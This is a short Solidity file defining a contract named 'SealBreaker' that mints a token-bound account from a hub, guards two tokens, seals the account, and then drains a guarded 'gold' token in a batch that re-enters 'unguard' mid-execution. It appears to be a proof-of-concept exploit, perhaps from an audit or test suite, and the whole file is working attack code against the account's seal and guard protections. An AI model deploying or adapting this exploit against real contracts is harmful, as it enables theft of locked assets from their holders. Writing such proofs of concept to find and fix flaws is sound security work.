// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IHub { function mint() external payable returns (uint256); function embody(uint256) external returns (address); function account(uint256) external view returns (address); }
interface IAcct {
    function guard(address) external;
    function unguard(address) external;
    function seal(uint64) external;
    function execute(address,uint256,bytes calldata,uint8) external payable returns (bytes memory);
    struct Call { address to; uint256 value; bytes data; }
    function executeBatch(Call[] calldata) external payable returns (bytes[] memory);
}

/// A contract holder that re-enters `unguard` from inside a sealed batch.
contract SealBreaker {
    IHub public hub; address public acct; address public blind;
    uint256 public id;
    receive() external payable {}
    function setup(address h, address brk, address gold) external payable {
        hub = IHub(h);
        id = hub.mint{value: msg.value}();
        acct = hub.embody(id);
        IAcct(acct).guard(brk);   // index 0
        IAcct(acct).guard(gold);  // index 1
        blind = brk;
    }
    function sealIt(uint64 until) external { IAcct(acct).seal(until); }
    /// called by the account, from inside the sealed batch
    function trigger() external { IAcct(acct).unguard(blind); }
    function drain(address gold, uint256 amount, address to) external {
        IAcct.Call[] memory cs = new IAcct.Call[](2);
        cs[0] = IAcct.Call(gold, 0, abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        cs[1] = IAcct.Call(address(this), 0, abi.encodeWithSignature("trigger()"));
        IAcct(acct).executeBatch(cs);
    }
}
